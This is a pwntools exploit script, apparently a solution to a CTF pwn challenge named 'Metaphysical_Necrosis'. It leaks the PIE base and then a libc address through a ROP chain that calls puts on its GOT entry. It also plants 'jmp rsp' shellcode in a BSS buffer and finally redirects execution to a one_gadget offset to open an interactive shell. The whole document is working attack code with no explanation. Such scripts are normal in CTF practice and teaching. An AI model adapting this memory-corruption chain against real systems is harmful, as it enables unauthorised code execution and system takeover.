from pwn import*
from LibcSearcher import*
p = process('Metaphysical_Necrosis')
elf = ELF('Metaphysical_Necrosis')
context.log_level = 'debug'
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

libc = ELF('libc-2.23.so')
#p = remote('47.103.214.163',21003)
p.recv()
p.sendline('3') #HI(var)
p.send('\x1A') #String<8B From [RBP-10] To Down
p.recv()
p.sendline()
p.recv()
p.sendline()
p.recv()
p.sendline('HGame') #name in BSS
p.recv()
p.sendline('0') #Array[160] [RBP-BO]
p.recv()
p.sendline()
p.recv()
p.sendline()
p.recv()
p.sendline('0') #LO(var)
p.recvuntil('\x57\x69\x6E\x0A')
pie = u64(p.recv(6).ljust(8,'\x00')) - 0xF1A
log.success('PIE:\t'+hex(pie))
p.sendline('U') #&E99+HI(var)

p.sendline('3') #HI(var)
p.send(p64(pie+0x2020E0)) #String<8B From [RBP-10] To Down
p.recv()
p.sendline()
p.recv()
p.sendline()
##
rop = p64(pie+0xF93)+p64(pie+elf.got['puts'])+p64(pie+elf.plt['puts']+4)+p64(pie+0xF1A)
payload = asm('jmp rsp;sub rsp, 0xB0;jmp rsp',arch = "amd64",os = "linux")
p.sendline(payload) #name in BSS
##
p.sendline('4') #Array[160] [RBP-BO]
p.sendline(p64(pie+0xF93))
p.sendline(p64(pie+elf.got['puts']))
p.sendline(p64(pie+elf.plt['puts']+4))
p.sendline(p64(pie+0xF1A))
p.recv()
p.sendline()
p.recv()
p.sendline()
p.recv()
gdb.attach(p)
p.sendline('0') #LO(var)
###
p.recvuntil('\xEF\xBC\x81\n')
libcbase = u64(p.recvuntil('\x7f',drop=True).ljust(8,'\x00'))-libc.symbols['puts']


p.sendline('3') #HI(var)
p.send(p64(0xf1147+libcbase)) #String<8B From [RBP-10] To Down
p.recv()
p.sendline()
p.recv()
p.sendline()
p.recv()
p.sendline('HGame') #name in BSS
p.recv()
p.sendline('0') #Array[160] [RBP-BO]
p.recv()
p.sendline()
p.recv()
p.sendline()
p.recv()
p.sendline('0') #LO(var)

p.interactive()
